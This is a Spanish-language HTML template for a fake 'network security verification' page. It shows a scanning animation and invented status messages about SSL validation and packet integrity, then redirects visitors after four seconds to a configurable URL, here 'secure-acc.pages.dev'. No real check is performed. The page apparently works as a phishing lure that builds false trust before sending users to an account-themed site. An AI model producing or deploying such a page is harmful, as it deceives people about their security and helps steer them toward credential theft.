<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad de Red - Verificando Enlace</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #020617; }
        .progress-glow { box-shadow: 0 0 15px rgba(34, 197, 94, 0.5); }
        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
        .scanner { position: absolute; width: 100%; height: 2px; background: rgba(34, 197, 94, 0.2); animation: scan 3s linear infinite; }
    </style>
</head>
<body class="text-slate-100 min-h-screen flex items-center justify-center font-mono overflow-hidden">
    <div class="scanner"></div>
    
    <div class="max-w-md w-full p-8 border border-green-900/50 bg-slate-900/80 backdrop-blur-md rounded-xl shadow-2xl z-10">
        <div class="flex justify-center mb-6">
            <div class="p-3 bg-green-500/10 rounded-full">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
            </div>
        </div>

        <h1 class="text-lg font-bold text-center mb-1 tracking-tighter">SISTEMA DE VERIFICACIÓN</h1>
        <p class="text-slate-400 text-center text-xs mb-8 uppercase">Escaneando seguridad de la sesión...</p>

        <div class="w-full bg-slate-800 rounded-full h-1.5 mb-4">
            <div id="bar" class="bg-green-500 h-1.5 rounded-full transition-all duration-100 progress-glow" style="width: 0%"></div>
        </div>

        <div id="status" class="text-[10px] text-green-500/70 h-4 mb-8 text-center">Iniciando handshake...</div>

        <a id="link" href="#" class="block w-full py-3 bg-transparent border border-green-500/50 text-green-500 text-center text-xs hover:bg-green-500 hover:text-black transition-all font-bold">
            Acceder
        </a>
    </div>

    <script>
        // CONFIGURACIÓN: Pon tu URL aquí
        const URL_DESTINO = 'https://secure-acc.pages.dev/'; 
        const TIEMPO = 4000; 

        const bar = document.getElementById('bar');
        const status = document.getElementById('status');
        const link = document.getElementById('link');
        link.href = URL_DESTINO;

        const mensajes = [
            "Validando certificado SSL...",
            "Comprobando integridad de paquetes...",
            "Filtrando trazas de red...",
            "Acceso verificado. Redirigiendo..."
        ];

        let inicio = Date.now();

        function animar() {
            let transcurrido = Date.now() - inicio;
            let progreso = Math.min((transcurrido / TIEMPO) * 100, 100);
            
            bar.style.width = progreso + '%';
            
            // Cambiar mensajes según progreso
            if (progreso < 25) status.innerText = mensajes[0];
            else if (progreso < 50) status.innerText = mensajes[1];
            else if (progreso < 75) status.innerText = mensajes[2];
            else status.innerText = mensajes[3];

            if (progreso < 100) {
                requestAnimationFrame(animar);
            } else {
                setTimeout(() => { window.location.href = URL_DESTINO; }, 200);
            }
        }

        window.onload = animar;
    </script>
</body>
</html>
